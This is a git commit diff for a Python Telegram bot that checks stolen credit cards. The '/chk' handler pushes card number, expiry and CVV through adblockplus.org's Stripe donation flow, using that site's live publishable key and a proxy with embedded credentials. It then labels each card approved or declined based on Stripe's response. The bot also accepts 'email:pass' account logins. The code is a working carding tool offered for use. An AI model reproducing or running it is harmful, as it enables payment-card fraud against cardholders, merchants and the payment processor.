5b8d6cfcb07b0176a6a1f27db07a0a2e4722d725
Nitin1818 <74262832+xbinner18@users.noreply.github.com>
2021-08-13 00:32:26 +0530

    Updated

--- bot.py
+++ bot.py
@@ -2,12 +2,13 @@ import logging
 import os
 import requests
 import time
+import string
+import random
 
 from aiogram import Bot, Dispatcher, executor, types
 
 ENV = bool(os.environ.get('ENV', True))
 TOKEN = os.environ.get("TOKEN", None)
-BLACKLISTED = os.environ.get("BLACKLISTED", None)
 URL = os.environ.get("URL", None) 
 PREFIX = "!/"
 
@@ -17,13 +18,22 @@ logging.basicConfig(level=logging.INFO)
 # Initialize bot and dispatcher
 bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
 dp = Dispatcher(bot)
+p = {
+    "http": "http://customer-ua42699717-cc-us:112898896210@54.39.209.193:7000"
+    }
+session = requests.session()
+
+#random str
+N = 10
+rnd = ''.join(random.choices(string.ascii_lowercase +
+                                string.digits, k = N))
 
 
 @dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
-async def send_welcome(message: types.Message):
+async def helpstr(message: types.Message):
     await message.answer_chat_action("typing")
     await message.reply(
-        "Hello how to use <code>/chk cc/mm/yy/cvv</code>"
+        "Hello how to use <code>/chk cc/mm/yy/cvv</code>\nREPO [HERE](https://github.com/xbinner18/Mrbannker)"
     )
     
 
@@ -39,7 +49,6 @@ async def tv(message: types.Message):
         return await message.reply(
             "<code>Send ac /tv email:pass.</code>"
         )
-    session = requests.session()
     payload = {
         "username": email,
         "password": password,
@@ -84,30 +93,111 @@ async def ch(message: types.Message):
     tic = time.perf_counter()
     await message.answer_chat_action("typing")
     cc = message.text[len('/chk '):]
-    _bin = cc[0:11]
-    if _bin in BLACKLISTED:
-        return await message.reply(
-            "<b>BLACKLISTED BIN</b>"
-            )
+    splitter = cc.split('|')
+    ccn = splitter[0]
+    mm = splitter[1]
+    yy = splitter[2]
+    cvv = splitter[3]
+    email = f"{str(rnd)}@gmail.com"
     if not cc:
         return await message.reply(
             "<code>Send Card /chk cc|mm|yy|cvv.</code>"
         )   
-    res = requests.get(
-        f"{URL}/api.php/?lista={cc}"
-    ).json()
+    # get guid muid sid
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    s = session.post("https://m.stripe.com/6",
+                     headers=headers, proxies = p)
+    r = s.json()
+    Guid = r["guid"]
+    Muid = r["muid"]
+    Sid = r["sid"]
+    
+    # now 1 req
+    payload = {
+      "lang": "en",
+      "type": "donation",
+      "currency": "USD",
+      "amount": "5",
+      "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
+      "currencySign": "$"
+    }
+    
+    head = {
+      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Accept": "*/*",
+      "Origin": "https://adblockplus.org",
+      "Sec-Fetch-Dest": "empty",
+      "Referer": "https://adblockplus.org/",
+      "Accept-Language": "en-US,en;q=0.9"
+    }
+    
+    re = session.post("https://new-integration.adblockplus.org/",
+                     data=payload, headers=head, proxies = p)
+    client = re.text
+    pi = client[0:27]
+    
+    #hmm
+    load = {
+      "receipt_email": email,
+      "payment_method_data[type]": "card",
+      "payment_method_data[billing_details][email]": email,
+      "payment_method_data[card][number]": ccn,
+      "payment_method_data[card][cvc]": cvv,
+      "payment_method_data[card][exp_month]": mm,
+      "payment_method_data[card][exp_year]": yy,
+      "payment_method_data[guid]": Guid,
+      "payment_method_data[muid]": Muid,
+      "payment_method_data[sid]": Sid,
+      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
+      "payment_method_data[referrer]": "https://adblockplus.org/",
+      "expected_payment_method_type": "card",
+      "use_stripe_sdk": "true",
+      "webauthn_uvpa_available": "true",
+      "spc_eligible": "false",
+      "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
+      "client_secret": client
+    }
+    
+    header = {
+      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Accept": "application/json",
+      "Origin": "https://js.stripe.com",
+      "Referer": "https://js.stripe.com/",
+      "Accept-Language": "en-US,en;q=0.9"
+    }
+    
+    rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
+                     data=load, headers=header, proxies = p)
+    res = rx.json()
+    msg = res["error"]["message"]
     toc = time.perf_counter()
-    INFO = f'''
-<b>STRIPE AUTH</b>
-CC ➟ <code>{cc}</code>
-STATUS ➟ <b>{res["res"]}</b>
-BRAND ➟ <b>{res["brand"]}</b>
-BANK ➟ <b>{res["bank"]}</b>
-COUNTRY ➟ <b>{res["country"]}</b>
-TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
-<b>CHKBY</b> ➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
-'''
-    await message.reply(INFO)  
+    if "incorrect_cvc" in rx.text:
+        await message.reply(f"""
+<b>CC</b>➟ <code>{cc}</code>
+<b>STATUS</b>➟ #ApprovedCCN
+<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+""")
+    elif rx.status_code is 200:
+        await message.reply(f"""
+<b>CC</b>➟ <code>{cc}</code>
+<b>STATUS</b>➟ ✅#ApprovedCVV
+<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+""")
+    else:
+        await message.reply(f"""
+<b>CC</b>➟ <code>{cc}</code>
+<b>STATUS</b>➟ ❌Declined[{msg}]
+<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
+""")  
     
     
 if __name__ == '__main__':
